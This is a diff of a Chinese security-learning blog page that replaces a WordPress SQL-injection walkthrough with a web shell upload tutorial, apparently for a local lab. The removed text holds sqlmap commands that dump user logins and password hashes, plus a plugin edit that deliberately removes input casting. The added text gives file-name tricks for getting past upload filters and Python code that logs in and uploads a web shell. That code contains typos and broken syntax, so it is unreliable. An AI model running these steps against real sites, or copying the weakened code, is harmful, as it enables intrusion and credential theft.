@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web攻击--SQL注入, Airi Suzuki">
+    <meta name="keywords" content="Web shell攻击, Airi Suzuki">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Web攻击--SQL注入 | Airi Suzuki</title>
+    <title>Web shell攻击 | Airi Suzuki</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -315,12 +315,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Web攻击--SQL注入</h1>
+                    <h1 class="description center-align post-title">Web shell攻击</h1>
                 </div>
             </div>
         </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-03-19
+                    2021-03-21
                 </div>
                 
 
@@ -469,107 +469,158 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、Web服务模式"><a href="#一、Web服务模式" class="headerlink" title="一、Web服务模式"></a>一、Web服务模式</h2><p><img src="https://www.hualigs.cn/image/60549af556d79.jpg" alt=""></p>
-<h2 id="二、搭建测试环境"><a href="#二、搭建测试环境" class="headerlink" title="二、搭建测试环境"></a>二、搭建测试环境</h2><p><img src="https://www.hualigs.cn/image/60549af56f676.jpg" alt=""></p>
+                <h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ul>
+<li><p>Web shell程序含有可以向系统下达命令的代码，使用简单的服务器脚本（JSP、PHP）等即可编写。利用Web网站提供的文件上传功能，将Web shell上传至Web网站，然后调用URL直接执行</p>
+</li>
+<li><p>大部分Web网站通过检查文件扩展名防范Web shell攻击，但很多方法可以绕过Web网站的检查<br><img src="https://www.hualigs.cn/image/60574fda88b40.jpg" alt=""></p>
+</li>
+<li><p>在Apache Web服务器中可以运行的文件有.php、.html、.cer等。假设上传的文件名为webshell.php，在其中植入用于攻击系统的代码，然后通过URL调用执行webshell.php，不断改变输入值，尝试发动多种攻击，比如非法收集服务器信息、获取管理员权限、浏览源代码、插入恶意脚本、窃取服务器内部资料等</p>
+</li>
+<li><p>有些Web服务器的文件上传功能是使用Flash实现的，无法通过查看HTML源代码推导其工作原理。需要安装HTTP Analyzer程序，通过分析浏览器的HTTP协议数据对浏览器的行为进行监视，查找文件上传所需信息</p>
+</li>
+<li><p>由于WordPress不允许上传扩展名为.php的文件，所以将文件扩展名修改为.html，再将其上传到服务器。与.php文件类似，.HTML文件中的PHP代码也能运行。webshell.html文件正常执行后，即可获取Web服务器的多种环境信息，比如Apache安装信息、PHP环境信息、系统环境变量信息、MySQL设置信息等</p>
+</li>
+<li><p>Apache配置</p>
 <ul>
-<li>服务器PC中搭建用于黑客攻击的Web网站</li>
-<li>为了测试方便，AMP、Wordpress均使用默认设置，数据库名称为wordpress，所有账号/密码全部设为python</li>
-<li>黑客PC中开发用于入侵Web网站的Python程序</li>
-<li>客户机PC执行普通用户的正常操作</li>
-<li>修改虚拟PC网络设置（NAT/内网、windows防火墙、host文件）</li>
-</ul>
-<p>WordPress使用了安全编码，不容易进行攻击</p>
-<ul>
-<li>为了成功进行攻击，可安装安全性相对较差的插件（视频相关插件），下载插件后解压缩，将其放入服务器目录</li>
-<li>打开提供环境访问功能的程序文件C:\APM_Setup\htdocs\wordpress\wpcontent\plugins\all-wideo-gallery\config.php，修改代码</li>
-</ul>
-<pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token operator">*</span>$_vid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span>
-<span class="token operator">/</span><span class="token operator">*</span>$_pid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span>
-$_vid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span>
-$_pid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span></code></pre>
-<h2 id="三、SQL注入"><a href="#三、SQL注入" class="headerlink" title="三、SQL注入"></a>三、SQL注入</h2><ul>
-<li>利用应用程序的安全漏洞</li>
-<li>SQL注入攻击主要向（接收并处理用户输入）变量值插入攻击代码以发动攻击</li>
-</ul>
-<pre class=" language-python"><code class="language-python"><span class="token operator">//</span>常用的用户认证代码
-$query<span class="token operator">=</span><span class="token string">"SELECT * FROM USER WHERE ID=$id and PWD=$pwd"</span>
-$result<span class="token operator">=</span>MySQL<span class="token punctuation">:</span>query<span class="token punctuation">(</span>$query<span class="token punctuation">,</span>$connect<span class="token punctuation">)</span></code></pre>
-<ul>
-<li>向网页上的id栏输入如下值：”1 OR 1=1–”</li>
-<li>提交后组成如下SQL语句</li>
-</ul>
-<pre class=" language-python"><code class="language-python"><span class="token string">"SELECT * FROM USER WHERE ID=1 OR 1=1 -- and PWD=$pwd"</span>    <span class="token operator">//</span><span class="token operator">-</span><span class="token operator">-</span>后变为SQL注释</code></pre>
-<ul>
-<li>要成功进行SQL注入，必须不断更改输入值，找出系统漏洞。这是简单的重复工作，所以可以通过编写程序实现自动化</li>
-<li>Python提供了实现这种自动化的多种模块，其中最具代表性的是sqlmap(sqlmap.org)</li>
-<li>下载解压zip文件后，放入C:\Python\sqlmap目录，运行目录下的sqlmap.py文件即可安装</li>
-<li>使用sqlmap进行黑客攻击的流程</li>
-<li>将Web网站视为“黑盒”，从最简单的信息开始，一点点找出所需信息。发动SQL注入攻击一般经过如下5个步骤：<ul>
-<li>1.搜索URL：SQL注入攻击基于URL，主要攻击目标是GET方法，将用户的输入值添加到URL并进行传送。可以很容易搜到攻击目标URL，攻击特定网站时，要尝试打开多个页面，观察URL的变化。此时，需要具备HTML与JavaScript相关知识</li>
-<li>2.寻找漏洞：使用sqlmap.py程序，可以寻找所选URL的漏洞。由于大部分应用程序都含有防御SQL注入攻击的代码，所以需要使用Web爬虫等自动化工具，找出含有漏洞的URL。Web爬虫程序能够从指定网站下载多个页面，并且分析HTML代码，找出有可能被攻击的URL</li>
-<li>3.搜索数据库：找到目标URL的漏洞后，搜索数据库中有哪些数据表。分析表名就能知道哪些表含有重要信息</li>
-<li>4.搜索列：搜索所选表中的列。由于列名能够反映数据特征，所以能够轻松找出包含重要信息的列</li>
-<li>5.访问数据：访问所选列包含的数据。若数据处于加密状态，sqlmap将使用字典攻击技术对数据解密</li>
+<li>在apache的conf目录中修改文件httpd.conf</li>
+<li>搜索AddType application/</li>
+<li>在下面添加AddType application/x-httpd-php.html，使得后缀是html的文件，也会经过php引擎处理执行</li>
+<li>建议不要这样做：不安全，加重服务器负担</li>
 </ul>
 </li>
 </ul>
-<h2 id="四、实例"><a href="#四、实例" class="headerlink" title="四、实例"></a>四、实例</h2><ul>
-<li>此处省略对URL进行搜索的过程，直接尝试对config.php（用于提供WordPress插件的环境信息）发动SQL注入攻击</li>
-<li>转到C:\Python\sqlmap目录，输入命令</li>
+<h2 id="二、HTTP文件上传详细流程"><a href="#二、HTTP文件上传详细流程" class="headerlink" title="二、HTTP文件上传详细流程"></a>二、HTTP文件上传详细流程</h2><ul>
+<li>登录：可以通过注册加入、SQL注入攻击或者密码破解攻击获取认证信息</li>
+<li>保存Cookie：若想通过不断修改文件名尝试上传文件，则应该在Python程序内部（非浏览器）保持登录状态。由于服务器与浏览器之间的认证信息通过Cookie进行维持，所以需要在登录后保存接收的Cookie，并再次传送给服务器</li>
+<li>加载文件：上传可以通过URL执行的文件是一项重复性工作。大部分网站都禁止用户上传以.php、.js等为扩展名的文件。因此，攻击者必须不断尝试使用各种形式的文件名创建文件，以绕过网站的安全防护发动攻击，读取文件，加载数据</li>
+<li>设置HTTP头信息，比如User-Agent、Content-Type等</li>
+<li>设置HTTP体：其中保存着要传给服务器的数据。对于服务器中用于处理文件上传的程序，可以通过分析HTTP数据包得到其要求的默认值，其余是与文件相关的数据</li>
+<li>文件传送：使用准备好的HTTP头与体调用服务器页面。传送成功后，可通过URL调用Web shell程序。若传送失败，则返回步骤3，再次传送其它名称的文件</li>
 </ul>
-<pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL</code></pre>
-<p>sqlmap支持多种选项，上述命令中用到的几个选项中，-u选项表示后面出现的是URL，–level选项表示要执行的测试级别，–risk选项用于设置待执行测试的风险等级，–dbms选项指定要使用的数据库类型（若不指定，则对sqlmap支持的所有类型的数据库探测漏洞）</p>
+<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p><strong>例1 登录</strong></p>
 <ul>
-<li><p>–level选项，测试级别</p>
+<li>该程序使用cookielib模块，用于处理Cookie，支持从HTTP响应查找Cookie信息，并将其保存为可用形式。登录后，向服务器请求需要认证的页面时，必须使用该模块</li>
+<li>执行代码可访问登录页面，并传递用户名与密码。最终，获取成功登录信息以及Cookie信息</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>stat<span class="token punctuation">,</span>mimetypes<span class="token punctuation">,</span>httplib
+<span class="token keyword">import</span> urllib<span class="token punctuation">,</span>urllib2
+<span class="token keyword">from</span> cookieli6 <span class="token keyword">import</span> CookieJar
+<span class="token keyword">import</span> time
+<span class="token triple-quoted-string string">'''
+创建CookieJar对象：CookieJar类用于从HTTP Request对象提取Cookie，
+并将Cookie返回HTTP Response对象
+'''</span>
+cj<span class="token operator">=</span>cookieJar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+创建Opener对象，可以使用HTTP协议调用服务
+创建的Opener对象提供open()方法，接收Request作为参数调用服务
+'''</span>
+opener<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>urllib2<span class="token punctuation">.</span>HTTPCookieProcessor<span class="token punctuation">(</span>cj<span class="token punctuation">)</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span>
+values<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'log'</span><span class="token punctuation">:</span><span class="token string">"python"</span>
+    <span class="token string">'pwd'</span><span class="token punctuation">:</span><span class="token string">"python"</span>
+<span class="token punctuation">}</span>
+headers<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilia/4.0(compatible; MSIE5.5; Windows NT)'</span>
+    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'http://server/wordpress/wp-admin/'</span>
+<span class="token punctuation">}</span>
+data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>
+request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+通过Opener对象调用服务后，可以保持登录信息，并且可以不断调用服务
+通过更改Request对象的头与体值，可以不断变更调用的服务
+'''</span>
+response<span class="token operator">=</span>opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>request<span class="token punctuation">)</span></code></pre>
+<p><strong>例2 设置表单数据</strong></p>
 <ul>
-<li>0：仅输出Python反向追踪(traceback)信息、错误及重要信息(Critical Message)</li>
-<li>1：显示信息与警告信息，该值为默认值</li>
-<li>2：同时显示所有调试信息</li>
-<li>3：同时显示插入的有效载荷信息</li>
-<li>4：同时显示HTTP请求信息</li>
-<li>5：同时显示HTTP响应头信息</li>
-<li>6：同时显示HTTP响应页面内容信息</li>
+<li>实现文件上传的HTML中，通常会将’ enctype=”multipart/form data” ‘放入<form>标记的属性。编写表单数据设置程序，采用不同于常规POST方式的其他格式以构成协议体</form></li>
+<li>表单数据设置结果</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>stat<span class="token punctuation">,</span>mimetypes<span class="token punctuation">,</span>httplib
+<span class="token keyword">import</span> urllib<span class="token punctuation">,</span>urllib2
+<span class="token keyword">from</span> Gookieli6 <span class="token keyword">import</span> CookieJar
+<span class="token keyword">import</span> time
+<span class="token triple-quoted-string string">'''
+声明函数，接收两个列表作为参数，以form-data形式创建数据与附件
+'''</span>
+<span class="token keyword">def</span> <span class="token function">encode_multipart_formdata</span><span class="token punctuation">(</span>fields<span class="token punctuation">,</span>files<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">'''
+    设置boundary：设置form-data时，各值由boundary进行区分
+    设置为与HTTP Analyzer中的boundary一样的形式
+    '''</span>
+    BOUNDARY<span class="token operator">=</span><span class="token string">"--pluploadboundary %S"</span> <span class="token operator">%</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    CRLF<span class="token operator">=</span><span class="token string">'\r\n'</span>    <span class="token comment" spellcheck="true">#回车换行</span>
+    L<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token punctuation">]</span>
+    <span class="token triple-quoted-string string">'''
+    设置传送数据：将创建类时作为参数传入的field列表值设置为form-data格式
+    负责设置文件以外的各种传送数据，各值使用boundary进行区分
+    '''</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token keyword">in</span> fields<span class="token punctuation">:</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--'</span><span class="token operator">+</span>BOUNDARY<span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Disposition:form-data; name="%s" %key'</span><span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+    <span class="token triple-quoted-string string">'''
+    设置传送文件：将创建类时作为参数传入的files列表值设置为form-data格式
+    除name外，还另外设置filename与contentType，向数据部分输入文件内容
+    '''</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span>fd<span class="token punctuation">)</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
+        file_size<span class="token operator">=</span>os<span class="token punctuation">.</span>fstat<span class="token punctuation">(</span>fd<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>stat<span class="token punctuation">.</span>ST_SIZE<span class="token punctuation">]</span>
+        filename<span class="token operator">=</span>fd<span class="token punctuation">.</span>name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+        contenttype<span class="token operator">=</span>mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">or</span> <span class="token string">'application/octet-stream'</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--%s'</span> <span class="token operator">%</span>BOUNDARY<span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Disposition:form-data; name="%s";filename="s" '</span> <span class="token operator">%</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Type:%s'</span> <span class="token operator">%</span>contenttype<span class="token punctuation">)</span>
+        fd<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span>'\r\n<span class="token punctuation">;</span><span class="token operator">+</span>fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--'</span><span class="token operator">+</span>BOUNDARY<span class="token operator">+</span><span class="token string">'--'</span><span class="token punctuation">)</span>
+    L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
+    body<span class="token operator">=</span>CRLF<span class="token punctuation">.</span>join<span class="token punctuation">(</span>L<span class="token punctuation">)</span>
+    contenttype<span class="token operator">=</span><span class="token string">'multipart/form-data;boundary=%s'</span> <span class="token operator">%</span>BOUNDARY
+    <span class="token keyword">return</span> contenttype<span class="token punctuation">,</span>body
+<span class="token triple-quoted-string string">'''
+设置fields：创建要作为参数传递给类的fields列表，一般指定为传递给服务器的值
+设置HTTP Analyzer中查看的所有值，WordPress中，经过一段时间后，之前创建的值
+会失效，所以不要使用此处的值，而使用通过HTTP Analyzer分析得到的值
+'''</span>
+fields<span class="token operator">=</span><span class="token punctuation">[</span>
+    <span class="token punctuation">(</span><span class="token string">"post_id"</span><span class="token punctuation">,</span><span class="token string">"59"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">(</span><span class="token string">"_wpnonce"</span><span class="token punctuation">,</span><span class="token string">"7716717b8c"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">,</span><span class="token string">"upload-attachment"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"webshell.html"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+
+<span class="token comment" spellcheck="true"># various types file test</span>
+<span class="token triple-quoted-string string">'''
+打开要传送的文件，创建要作为参数传递给类的files列表
+此时，可以从HTTP Analyzer获取用作name的asyn-upload值
+'''</span>
+fd<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"webshell.html"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span>
+files<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"async-upload"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token triple-quoted-string string">'''
+创建表单数据，创建类后，作为结果返回content-type与body。body对应于表单数据
+调用文件上传URL时，两个值都要传送
+'''</span>
+content_type<span class="token punctuation">,</span>body<span class="token operator">=</span>encode_multipart_formdata<span class="token punctuation">(</span>fields<span class="token punctuation">,</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span> body</code></pre>
+<p>结果：<br><img src="https://www.hualigs.cn/image/60574fda83633.jpg" alt=""></p>
+<ul>
+<li>为确保系统安全，通常禁止用户上传可以在服务器中运行的文件。因此，通常采用如下方式不断修改文件扩展名，反复尝试攻击<ul>
+<li>放入特殊字符：尝试文件上传时，文件名放入%、空格、*、/、\等特殊字符，这些字符可能会在处理扩展名时引发错误</li>
+<li>重复扩展名：比如webshell.txt.php、webshell.txt.txt.txt.php等</li>
+<li>编码：使用迂回方法，比如webshell.php.kr、webshell.php.iso8859-8（希伯来语编码）等</li>
 </ul>
 </li>
-<li><p>–risk选项，用于设置待执行测试的风险，表示攻击所用SQL代码的危险程度，风险等级越高，表示相关网站出现问题的可能性越高</p>
-<ul>
-<li>1：注入无问题代码，执行测试，默认值（Normal Injection（使用union）、Blind Injection（使用true：1=1，false：1=2））</li>
-<li>2：执行Time-based Injection using heavy query。进行Blind Injection时，若不论真假都有相同结果值，则经过指定的待机时间后，通过测定时间判断插入的查询是否得以执行</li>
-<li>3：使用OR-based Injection。若被攻击的目标程序执行update语句，则插入的or语句就会导致致命问题</li>
+<li>前述两段代码可组合为一个攻击程序<ul>
+<li>登录过程中创建的Opener对象内部含有Cookie信息，若使用该Opener对象再次调用URL，Cookie就会被原封不动地包含到HTTP头部进行传送，即可顺利通过认证</li>
+<li>调用文件上传URL，上传文件的位置信息将被包含到Response并一同传回，即可发动Web shell攻击</li>
+<li>运行结果，将url处理后放入地址栏即可</li>
 </ul>
 </li>
-<li><p>探测漏洞结果<br><img src="https://www.hualigs.cn/image/60549af5bb2dd.jpg" alt=""></p>
-</li>
+<li>在程序中可以修改HTTP头与体数据，为供给提供了很大便利。比如，Web服务器会根据User-Agent值修改UI与脚本，若在PC中随意修改User-Agent，就能发动多种攻击</li>
+<li>密码破解攻击或Web shell攻击中，通过使用循环语句不断修改输入值，可以尝试进行多种攻击<br>3/21/2021 9:58:50 PM </li>
 </ul>
-<p>由探测结果可知，vid与pid存在漏洞。通过改变两个变量的输入值，可以进一步获取更多信息</p>
-<ul>
-<li>利用找到的漏洞，继续搜索数据库中有哪些表</li>
-</ul>
-<pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span><span class="token operator">-</span>tables</code></pre>
-<p>–tables选项用于获取数据表列表。使用–table选项可以读取数据库中所有表的信息，然后找出含有用户信息的数据表</p>
-<ul>
-<li>数据表搜索结果<br><img src="https://www.hualigs.cn/image/60549af589a23.jpg" alt=""></li>
-</ul>
-<p>观察数据表列表可以发现，wp_users最有可能保存用户数据</p>
-<ul>
-<li>继续从wp_users数据表中提取所有数据列</li>
-</ul>
-<pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns</code></pre>
-<p>-T选项用于指定数据表<br>–columns选项用于从指定数据表提取所有数据列</p>
-<ul>
-<li>数据列搜索结果<br><img src="https://www.hualigs.cn/image/60549af4e7955.jpg" alt=""></li>
-</ul>
-<p>从搜索的数据列看，数据列user_login与user_pass分别保存用户ID与密码。只要得到用户名与密码，对网站的攻击就成功了。</p>
-<ul>
-<li>最后一步：从user_login与user_pass字段提取用户登录信息</li>
-</ul>
-<pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns <span class="token operator">-</span>C user_login<span class="token punctuation">,</span> user_pass <span class="token operator">-</span><span class="token operator">-</span>dump</code></pre>
-<p>-C选项 用于指定要进行攻击的数据列，指定多个数据列时用逗号隔开</p>
-<p>–dump选项 用于从指定数据列提取所有数据</p>
-<ul>
-<li>数据提取结果<br><img src="https://www.hualigs.cn/image/60549af5247a2.jpg" alt=""></li>
-</ul>
-<p>数据提取过程中会遇到两个问题，一个为是否保存散列数据、另一个为是否对散列数据进行解密，全部选择y，使用sqlmap提供的解码工具可以对密码进行解密<br>3/19/2021 8:47:52 PM </p>
 
                 
             </div>
@@ -596,7 +647,7 @@ $result<span class="token operator">=</span>MySQL<span class="token punctuation"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2021/03/19/web-gong-ji-sql-zhu-ru/">http://yoursite.com/2021/03/19/web-gong-ji-sql-zhu-ru/</a>
+                    <a href="http://yoursite.com/2021/03/21/web-shell-gong-ji/">http://yoursite.com/2021/03/21/web-shell-gong-ji/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -803,9 +854,48 @@ $result<span class="token operator">=</span>MySQL<span class="token punctuation"
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2021/03/21/web-shell-gong-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Web shell攻击">
+                        
+                        <span class="card-title">Web shell攻击</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            妖寂
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/03/21/web-gong-ji-mi-ma-po-jie-gong-ji/">
                     <div class="card-image">
@@ -823,45 +913,8 @@ $result<span class="token operator">=</span>MySQL<span class="token punctuation"
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            妖寂
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/18/ying-yong-cheng-xu-gong-ji/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="应用程序攻击">
-                        
-                        <span class="card-title">应用程序攻击</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-21
                             </span>
                         <span class="publish-author">
                             
